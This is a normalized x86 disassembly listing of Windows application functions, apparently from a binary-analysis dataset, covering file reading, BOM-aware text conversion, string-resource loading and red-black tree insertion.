mov [ esi + 0x14 ] edi
sub_442390
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push esi
cmp eax 0x1
jne r-xdata
mov eax [ ecx + 0x38 ]
pop ebp
retn 0x4
cmp eax 0x2
jne r-xdata
cmp [ ecx + 0x3c ] 0x0
lea esi [ ecx + 0x3c ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
cmp [ ecx + 0x40 ] 0x0
lea esi [ ecx + 0x40 ]
jne r-xdata
mov eax [ esi ]
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ esi ]
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ ecx + 0x44 ]
push esi
push eax
call sub_4419a0
mov ecx [ ecx + 0x48 ]
push esi
push ecx
call sub_4419a0
sub_4423f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44685c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp edi ebx
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp + 0xc ] ebx
call sub_442730
cmp al bl
je r-xdata
mov esi [ ebp + 0xc ]
cmp esi 0x2
jbe r-xdata
push 0x14
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x10 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] esi
mov [ eax + 0x10 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4424d0
push ebp
mov ebp esp
mov eax [ esi + 0x14 ]
sub esp 0x8
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push edi
push 0x3
push edi
push 0x1
push 0x80000000
push eax
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x34 ] edi
call [ CreateFileW@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ esi + 0x14 ] edi
push ebx
push edi
push eax
mov [ ebp + 0xb ] 0x0
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
call sub_443fa9
mov edx [ ebp - 0x8 ]
add esp 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
mov edi eax
push edi
push edx
mov [ ebp - 0x4 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor al al
pop edi
mov esp ebp
pop ebp
retn 0x4
mov bl [ ebp + 0xb ]
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ edi ] 0x2e66622e
jne r-xdata
mov eax 0x10000
cmp [ edi + 0x3c ] eax
jne r-xdata
cmp [ edi + 0x40 ] eax
jne r-xdata
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov ecx ebx
push edi
mov ebx esi
call sub_4425b0
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
call [ CloseHandle@IAT ]
push edi
call [ `placement delete closure'@IAT ]
add esp 0x4
mov al bl
pop ebx
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_4425b0
push ebp
mov ebp esp
push 0xffffffff
push sub_446834
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea edi [ ecx - 0x6c ]
add esi 0x6c
call [ Ordinal_crt_5@IAT ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push edi
push esi
push eax
mov eax [ ecx + 0xc ]
call eax
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push eax
call edx
add eax 0x6c
push eax
mov [ ebx + 0x1c ] eax
call sub_443fa9
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x18 ] eax
mov edi eax
mov ecx 0x1b
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add esp 0x4
push eax
mov esi eax
call edx
push eax
mov eax [ esi ]
mov ecx [ eax + 0x10 ]
push esi
call ecx
mov edx [ ebx + 0x14 ]
push eax
add edx 0x6c
push edx
call memcpy
mov eax [ ebx + 0x14 ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x20 ] eax
call sub_4426c0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4426c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
mov eax [ edi + 0x20 ]
mov ecx [ eax + 0x68 ]
push ebx
mov ebx [ edi + 0x18 ]
lea edx [ ecx + ebx + 0x6c ]
mov [ edi + 0x34 ] edx
add ebx 0x6c
cmp [ eax + 0x64 ] 0x0
push esi
mov [ esp + 0xc ] 0x0
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ edi + 0x20 ]
inc eax
add ebx 0x8c
mov [ esp + 0xc ] eax
cmp eax [ ecx + 0x64 ]
jb r-xdata
lea esi [ edi + 0x24 ]
lea ecx [ esp + 0x10 ]
mov edx esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_443060
push eax
push esi
lea esi [ esp + 0x20 ]
call sub_442d70
sub_442730
push ebp
mov ebp esp
push 0xffffffff
push sub_4467e2
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_442ac0
test ebx 0xffff0000
jne r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
xor eax eax
jmp r-xdata
movzx edi bx
call sub_402660
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ecx eax
mov edx edi
call sub_428210
mov [ ebp - 0x14 ] eax
lea ecx [ esi + 0x24 ]
lea ebx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
call sub_413460
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x28 ]
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea edi [ ebp - 0x10 ]
call sub_4429e0
mov edi [ ebp - 0x10 ]
test edi edi
jne r-xdata
push eax
mov eax edi
lea edi [ ebp - 0x10 ]
call sub_442ba0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ eax + 0x10 ]
mov ecx [ eax + 0x84 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax [ eax + 0x88 ]
add eax [ esi + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_442880
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
xor edi edi
push ecx
mov ecx [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call sub_442730
mov bl al
mov [ ebp + 0xb ] bl
test bl bl
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi [ ebp - 0x8 ]
mov al [ esi ]
cmp al 0xef
jne r-xdata
cmp al 0xff
jne r-xdata
cmp [ esi + 0x1 ] 0xbb
jne r-xdata
mov eax [ ebp - 0x4 ]
push edi
push edi
push eax
push esi
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov edi eax
push edi
push 0x0
call [ SysAllocStringLen@IAT ]
mov ecx [ ebp - 0x4 ]
push edi
mov ebx eax
push ebx
push ecx
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov edx [ ebp + 0xc ]
mov al [ ebp + 0xb ]
pop edi
pop esi
mov [ edx ] ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ esi + 0x1 ] 0xfe
jne r-xdata
cmp [ esi + 0x2 ] 0xbf
jne r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffe
shr ecx 0x1
push ecx
add esi 0x2
push esi
call [ SysAllocStringLen@IAT ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov edi [ ebp - 0x4 ]
push 0x0
push 0x0
add edi 0xfffffffd
push edi
add esi 0x3
push esi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov ebx eax
push ebx
push 0x0
call [ SysAllocStringLen@IAT ]
push ebx
push eax
push edi
push esi
push 0x0
push 0xfde9
mov [ ebp - 0x8 ] eax
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov al [ ebp + 0xb ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_442980
push ebp
mov ebp esp
push 0xffffffff
push sub_444d88
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4429e0
mov eax [ edi ]
push esi
mov esi [ eax - 0xc ]
test esi esi
jns r-xdata
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx esi
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ edi ]
lea ecx [ esi + 0x1 ]
push ecx
push eax
call [ _mbslwr_s@IAT ]
add esp 0x8
cmp eax 0x50
ja r-xdata
mov eax esi
mov ecx edi
call sub_442c60
push 0x80004005
call sub_402d00
movzx edx [ eax + lookup_table_442a6c ]
jmp [ edx * 4 + jump_table_442a5c ]
push 0x8007000e
call sub_402d00
mov eax [ edi ]
cmp esi [ eax - 0x8 ]
jg r-xdata
mov [ eax - 0xc ] esi
mov eax [ edi ]
mov [ esi + eax ] 0x0
mov eax edi
pop esi
retn
sub_442a70
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_442ac0
push esi
push edi
mov esi eax
test ebx ebx
je r-xdata
call sub_442b40
pop edi
mov eax esi
pop esi
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push ebx
push 0x0
push 0x3
call [ WideCharToMultiByte@IAT ]
lea edi [ eax - 0x1 ]
test edi edi
jle r-xdata
mov eax [ esi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx edi
or ecx edx
jge r-xdata
mov eax [ esi ]
push 0x0
push 0x0
push edi
push eax
push 0xffffffff
push ebx
push 0x0
push 0x3
call [ WideCharToMultiByte@IAT ]
mov eax [ esi ]
cmp edi [ eax - 0x8 ]
jg r-xdata
mov eax edi
mov ecx esi
call sub_442c60
push 0x80070057
call sub_402d00
mov [ eax - 0xc ] edi
mov ecx [ esi ]
mov [ edi + ecx ] 0x0
pop edi
mov eax esi
pop esi
retn
sub_442b40
mov ecx [ esi ]
cmp [ ecx - 0xc ] 0x0
lea eax [ ecx - 0x10 ]
push edi
mov edi [ eax ]
je r-xdata
pop edi
retn
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
add eax 0x10
mov [ esi ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
retn
push 0x80070057
call sub_402d00
sub_442ba0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
shr eax 0x4
inc eax
movzx ecx ax
push 0x6
push ecx
push edx
call [ FindResourceW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4026e0
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
movzx eax [ ebx ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
lea ecx [ ebx + 0x2 ]
push ecx
push 0x0
push 0x3
mov [ ebp + 0x8 ] ecx
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
jns r-xdata
mov eax [ edi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx esi
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ edi ]
movzx ecx [ ebx ]
mov edx [ ebp + 0x8 ]
push 0x0
push 0x0
push esi
push eax
push ecx
push edx
push 0x0
push 0x3
call [ WideCharToMultiByte@IAT ]
mov eax [ edi ]
cmp esi [ eax - 0x8 ]
jg r-xdata
mov eax esi
mov ecx edi
call sub_442c60
mov [ eax - 0xc ] esi
mov eax [ edi ]
mov [ esi + eax ] 0x0
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
sub_442c60
push esi
mov esi ecx
push edi
mov edi eax
mov eax [ esi ]
mov ecx [ eax - 0xc ]
cmp ecx edi
jle r-xdata
cmp [ eax - 0x4 ] 0x1
jle r-xdata
mov edi ecx
mov eax [ eax - 0x8 ]
cmp eax edi
jge r-xdata
push edi
push esi
call sub_442cc0
pop edi
pop esi
retn
pop edi
pop esi
retn
mov ecx eax
cmp ecx 0x40000000
jle r-xdata
cdq
sub eax edx
sar eax 0x1
add ecx eax
add ecx 0x100000
jmp r-xdata
mov edx ecx
call sub_442d40
mov ecx edi
cmp ecx edi
jge r-xdata
sub_442cc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov ecx [ esi - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ebx [ esi - 0xc ]
sub esi 0x10
push edi
call eax
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov edx [ edx ]
push 0x1
push ecx
mov ecx eax
call edx
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp ebx eax
jge r-xdata
call sub_402c00
inc eax
push eax
lea edx [ esi + 0x10 ]
push edx
lea ecx [ edi + 0x10 ]
push eax
push ecx
mov [ ebp + 0xc ] ecx
call [ memcpy_s@IAT ]
add esp 0x10
mov [ edi + 0x4 ] ebx
lea eax [ esi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax ebx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
mov [ edx ] ecx
pop ebx
pop ebp
retn 0x8
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_442d40
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
sub eax 0x10
cmp [ eax + 0x8 ] edx
jge r-xdata
call sub_402c00
test edx edx
jle r-xdata
push edi
mov edi [ ecx ]
push 0x1
push edx
push eax
mov eax [ edi + 0x8 ]
call eax
pop edi
test eax eax
jne r-xdata
add eax 0x10
mov [ esi ] eax
retn
sub_442d70
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call [ operator delete@IAT ]
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_442e40
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_42a5d0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_442e40
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_442e40
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
push r--data
call [ std::_Xlength_error@IAT ]
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_443060
push ebp
mov ebp esp
push 0xffffffff
push sub_4454fe
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi edx
push 0x18
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x14 ] eax
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
call _CxxThrowException
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0x14 ] bx
mov edx 0x1
mov [ ebp - 0x4 ] edx
lea ecx [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x2
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ edi ]
mov [ ecx ] esi
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
sub_443140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x428
call [ malloc@IAT ]
mov ecx [ ebp + 0x10 ]
mov esi eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ esi + 0x8 ] ecx
mov ecx [ ebp + 0x1c ]
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi ] 0x28
mov [ esi + 0xc ] 0x80001
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
add ecx 0x2
lea eax [ esi + 0x29 ]
lea edi [ ebx + 0x40 ]
movzx edx [ ecx - 0x2 ]
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
mov [ eax ] dl
movzx edx [ ecx ]
mov [ eax + 0x1 ] dl
movzx edx [ ecx + 0x2 ]
mov [ eax + 0x3 ] dl
movzx edx [ ecx + 0x3 ]
mov [ eax + 0x4 ] dl
movzx edx [ ecx + 0x4 ]
mov [ eax + 0x5 ] dl
movzx edx [ ecx + 0x6 ]
mov [ eax + 0x7 ] dl
movzx edx [ ecx + 0x7 ]
mov [ eax + 0x8 ] dl
movzx edx [ ecx + 0x8 ]
mov [ eax + 0x9 ] dl
movzx edx [ ecx + 0xa ]
mov [ eax + 0xb ] dl
movzx edx [ ecx + 0xb ]
mov [ eax + 0xc ] dl
movzx edx [ ecx + 0xc ]
mov [ eax + 0x2 ] bl
mov [ eax + 0x6 ] bl
mov [ eax + 0xa ] bl
mov [ eax + 0xd ] dl
mov [ eax + 0xe ] bl
